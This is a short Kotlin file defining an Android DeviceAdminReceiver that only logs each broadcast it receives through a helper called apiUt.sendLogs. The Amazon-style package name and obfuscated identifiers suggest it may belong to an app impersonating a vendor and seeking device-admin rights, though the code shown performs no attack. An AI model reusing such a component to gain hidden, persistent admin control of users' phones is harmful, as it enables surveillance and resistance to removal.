package com.amazon.zzz.Admin

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import com.amazon.zzz.ApiNm.apiUt

class admReceiverDeviceAdmin : DeviceAdminReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        apiUt.sendLogs(context, "", "admReceiverDeviceAdmin onReceive", "log")
    }
}